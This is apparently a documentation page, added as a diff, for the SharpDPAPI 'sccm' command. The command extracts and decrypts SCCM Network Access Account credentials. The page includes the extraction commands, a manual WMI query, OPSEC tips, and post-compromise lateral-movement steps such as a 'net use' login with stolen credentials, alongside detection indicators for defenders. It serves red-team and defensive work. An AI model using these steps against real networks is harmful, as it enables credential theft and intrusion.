@@ -1,0 +1,379 @@
+---
+title: 'sccm'
+description: 'Extract SCCM Network Access Account credentials'
+icon: 'network-wired'
+---
+
+## Overview
+
+The **sccm** command extracts and decrypts Microsoft SCCM (System Center Configuration Manager) Network Access Account (NAA) credentials from WMI. When elevated on an SCCM client machine, it retrieves the DPAPI_SYSTEM secret and decrypts the stored NAA credentials.
+
+<Info>
+  SCCM Network Access Accounts are domain credentials used by clients to access distribution points. These accounts often have elevated privileges in the environment.
+</Info>
+
+## Basic Usage
+
+```bash
+# Extract and decrypt SCCM NAA credentials (requires elevation)
+SharpDPAPI.exe sccm
+```
+
+<Warning>
+  This command requires **elevation** (Administrator or SYSTEM privileges) to:
+  - Access WMI for SCCM policy data
+  - Retrieve the DPAPI_SYSTEM LSA secret
+  - Decrypt the Network Access Account credentials
+</Warning>
+
+## Requirements
+
+<Steps>
+  <Step title="SCCM Client">
+    Target machine must be an SCCM client with the Configuration Manager client installed
+  </Step>
+
+  <Step title="Network Access Account">
+    SCCM environment must be configured with a Network Access Account
+  </Step>
+
+  <Step title="Elevation">
+    Must run with Administrator or SYSTEM privileges
+  </Step>
+</Steps>
+
+## How It Works
+
+<Steps>
+  <Step title="WMI Query">
+    Queries WMI for SCCM policy containing NAA credential blobs:
+    ```
+    root\ccm\Policy\Machine\ActualConfig
+    ```
+  </Step>
+
+  <Step title="DPAPI_SYSTEM Retrieval">
+    Elevates to SYSTEM and retrieves DPAPI_SYSTEM LSA secret
+  </Step>
+
+  <Step title="Masterkey Decryption">
+    Uses DPAPI_SYSTEM to decrypt system masterkeys
+  </Step>
+
+  <Step title="Credential Decryption">
+    Decrypts Network Access Account credentials using masterkeys
+  </Step>
+</Steps>
+
+## What Are SCCM Network Access Accounts?
+
+SCCM Network Access Accounts (NAA) are used by client machines to:
+
+<AccordionGroup>
+  <Accordion title="Content Access">
+    - Access distribution points for software packages
+    - Download OS deployment images
+    - Retrieve application content
+    - Access task sequences
+  </Accordion>
+
+  <Accordion title="Client Communication">
+    - Authenticate to SCCM infrastructure
+    - Access management points
+    - Communicate with distribution points
+    - Download policies and updates
+  </Accordion>
+
+  <Accordion title="Deployment Operations">
+    - OS deployment operations
+    - Software distribution
+    - Update management
+    - Application deployment
+  </Accordion>
+</AccordionGroup>
+
+<Note>
+  NAA credentials are typically domain accounts with access to distribution points and potentially other network resources.
+</Note>
+
+## Example Output
+
+```
+[*] Action: SCCM Network Access Account Extraction
+
+[*] Elevating to SYSTEM via token duplication for LSA secret retrieval
+[*] RevertToSelf()
+
+[*] Secret  : DPAPI_SYSTEM
+[*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
+[*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
+
+[*] SYSTEM master key cache:
+
+{1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C
+
+[*] Querying WMI for SCCM Network Access Account...
+
+[+] Network Access Account found:
+
+    Username: DOMAIN\sccm_naa
+    Password: P@ssw0rd123!
+    Domain  : DOMAIN
+```
+
+## Why Target SCCM NAA?
+
+<CardGroup cols={2}>
+  <Card title="Privileged Access" icon="crown">
+    NAA accounts often have elevated privileges for accessing network resources
+  </Card>
+  <Card title="Lateral Movement" icon="arrows-split-up-and-left">
+    Credentials work across SCCM infrastructure and distribution points
+  </Card>
+  <Card title="Persistence" icon="clock">
+    Credentials rarely change and work indefinitely
+  </Card>
+  <Card title="Wide Deployment" icon="globe">
+    Present on all SCCM client machines in the environment
+  </Card>
+</CardGroup>
+
+## Common Scenarios
+
+<AccordionGroup>
+  <Accordion title="Initial Access to SCCM Environment">
+    After compromising an SCCM client:
+
+    ```bash
+    # 1. Verify elevation
+    whoami /groups | findstr "S-1-5-32-544"
+
+    # 2. Extract NAA credentials
+    SharpDPAPI.exe sccm
+
+    # 3. Use credentials for lateral movement
+    # Credentials can access distribution points, management points, etc.
+    ```
+  </Accordion>
+
+  <Accordion title="Privilege Escalation via SCCM">
+    Discover privileged accounts through SCCM:
+
+    ```bash
+    # Extract NAA credentials
+    SharpDPAPI.exe sccm
+
+    # Test account privileges
+    # Often has access to:
+    # - File shares
+    # - Distribution points
+    # - Administrative shares
+    # - Other SCCM infrastructure
+    ```
+  </Accordion>
+
+  <Accordion title="Systematic SCCM Client Enumeration">
+    Extract credentials from multiple SCCM clients:
+
+    ```bash
+    # On each SCCM client machine
+    SharpDPAPI.exe sccm
+
+    # Compile unique NAA credentials
+    # Multiple sites may use different NAAs
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Finding SCCM Clients
+
+Identify SCCM client machines:
+
+**Registry Check:**
+```powershell
+# Check if SCCM client is installed
+Get-ItemProperty -Path "HKLM:\Software\Microsoft\SMS\Client\Configuration\Client Properties" -ErrorAction SilentlyContinue
+```
+
+**Service Check:**
+```powershell
+# Check for SCCM client service
+Get-Service -Name CcmExec -ErrorAction SilentlyContinue
+```
+
+**File System Check:**
+```powershell
+# Check for SCCM client directory
+Test-Path "C:\Windows\CCM"
+```
+
+**Active Directory:**
+```powershell
+# Find SCCM clients via AD
+Get-ADComputer -Filter * -Properties OperatingSystem |
+  Where-Object {$_.OperatingSystem -like "*Windows*"}
+```
+
+## SCCM Infrastructure Components
+
+Understanding SCCM infrastructure helps maximize the value of NAA credentials:
+
+**Distribution Points:**
+- Content storage locations
+- Software package repositories
+- NAA credentials provide access
+
+**Management Points:**
+- Client communication endpoints
+- Policy distribution
+- Status reporting
+
+**Site Servers:**
+- Central SCCM administration
+- Database servers
+- May be accessible with NAA credentials
+
+## Detection Considerations
+
+<Warning>
+  SCCM credential extraction is a high-value operation that should trigger security alerts.
+</Warning>
+
+**Host-Based Indicators:**
+- Elevation to SYSTEM privileges
+- LSA secret retrieval (DPAPI_SYSTEM)
+- WMI queries to SCCM namespaces
+- Access to CCM policy data
+- SharpDPAPI.exe process execution
+
+**WMI Indicators:**
+```
+Namespace: root\ccm\Policy\Machine\ActualConfig
+Query: SELECT * FROM CCM_NetworkAccessAccount
+```
+
+**Event Log Indicators:**
+```
+Event ID: 4624 (Logon)
+Logon Type: 3 (Network)
+Account Name: SYSTEM
+
+Event ID: 4656 (Object Access)
+Object: LSA Secrets
+Process: SharpDPAPI.exe or suspicious process
+```
+
+**Defensive Monitoring:**
+- Monitor WMI queries to SCCM namespaces
+- Alert on DPAPI_SYSTEM secret access
+- Track SYSTEM privilege elevation
+- Detect SharpDPAPI or similar tool execution
+- Monitor unusual process accessing WMI SCCM data
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="machinemasterkeys" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/commands/machinemasterkeys">
+    Extract machine masterkeys (uses same DPAPI_SYSTEM)
+  </Card>
+  <Card title="machinetriage" icon="server" href="/ghostpack-docs/SharpDPAPI-mdx/commands/machinetriage">
+    Comprehensive machine DPAPI triage
+  </Card>
+  <Card title="machinecredentials" icon="id-card" href="/ghostpack-docs/SharpDPAPI-mdx/commands/machinecredentials">
+    Extract machine credential files
+  </Card>
+  <Card title="backupkey" icon="download" href="/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey">
+    Retrieve domain backup key
+  </Card>
+</CardGroup>
+
+## Tips
+
+<Accordion title="Maximizing SCCM Exploitation">
+  - Target workstations and servers with SCCM client
+  - NAA credentials often work across entire SCCM infrastructure
+  - Test NAA credentials against distribution points
+  - Check for multiple NAA accounts (different sites)
+  - Correlate with SCCM infrastructure mapping
+</Accordion>
+
+<Accordion title="OPSEC Considerations">
+  - Requires elevation (high visibility)
+  - SYSTEM privilege elevation generates events
+  - WMI queries may be logged
+  - LSA secret access triggers alerts
+  - Consider timing and frequency of extraction
+</Accordion>
+
+<Accordion title="Troubleshooting">
+  **No NAA found:**
+  - SCCM environment may not be configured with NAA
+  - Machine may not be SCCM client
+  - NAA may not be cached on this client
+  - Check WMI namespace manually
+
+  **Access denied:**
+  - Need Administrator privileges
+  - UAC may block elevation
+  - AV/EDR may prevent SYSTEM elevation
+  - Security policy may restrict access
+
+  **SCCM client not found:**
+  - Verify SCCM client installation
+  - Check CcmExec service status
+  - Confirm CCM directory exists
+  - Machine may not be managed by SCCM
+</Accordion>
+
+## Manual SCCM NAA Extraction
+
+Alternative PowerShell method:
+
+```powershell
+# Query WMI for NAA policy
+$NAA = Get-WmiObject -Namespace "root\ccm\Policy\Machine\ActualConfig" -Class "CCM_NetworkAccessAccount"
+
+# Display encrypted credentials
+$NAA.NetworkAccessUsername
+$NAA.NetworkAccessPassword
+
+# Note: Password is DPAPI encrypted, requires decryption
+```
+
+## SCCM Lateral Movement
+
+After obtaining NAA credentials:
+
+<Steps>
+  <Step title="Enumerate SCCM Infrastructure">
+    ```powershell
+    # Find management points
+    Get-WmiObject -Namespace "root\ccm" -Class "SMS_Authority"
+
+    # Find distribution points
+    Get-WmiObject -Namespace "root\ccm" -Class "SMS_DistributionPoint"
+    ```
+  </Step>
+
+  <Step title="Test NAA Access">
+    ```bash
+    # Test authentication
+    net use \\distribution-point\SMS_DP$ /user:DOMAIN\sccm_naa P@ssw0rd123!
+    ```
+  </Step>
+
+  <Step title="Access SCCM Shares">
+    ```bash
+    # Access distribution points
+    dir \\distribution-point\SMS_DP$\
+
+    # Look for software packages, scripts, sensitive data
+    ```
+  </Step>
+</Steps>
+
+## Additional Resources
+
+<Card title="SCCM Security" icon="shield" href="https://www.microsoft.com/en-us/security/">
+  Learn about SCCM security best practices and hardening Network Access Accounts
+</Card>
